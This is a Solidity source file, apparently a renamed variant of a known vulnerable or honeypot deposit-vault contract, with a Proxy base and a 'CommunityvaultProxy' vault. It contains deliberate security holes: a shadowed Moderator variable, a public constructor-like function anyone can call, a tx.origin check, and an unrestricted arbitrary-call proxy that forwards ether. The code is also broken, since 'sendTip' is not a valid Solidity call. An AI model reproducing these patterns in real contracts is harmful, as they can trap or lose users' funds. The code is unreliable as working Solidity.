pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyAdmin { if (msg.sender == Moderator) _; } address Moderator = msg.sender;
    function sharekarmaGroupowner(address _founder) public onlyAdmin { Moderator = _founder; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract CommunityvaultProxy is Proxy {
    address public Moderator;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function CreatorVault() public payable {
        if (msg.sender == tx.origin) {
            Moderator = msg.sender;
            contribute();
        }
    }

    function contribute() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function redeemKarma(uint256 amount) public onlyAdmin {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.sendTip(amount);
        }
    }
}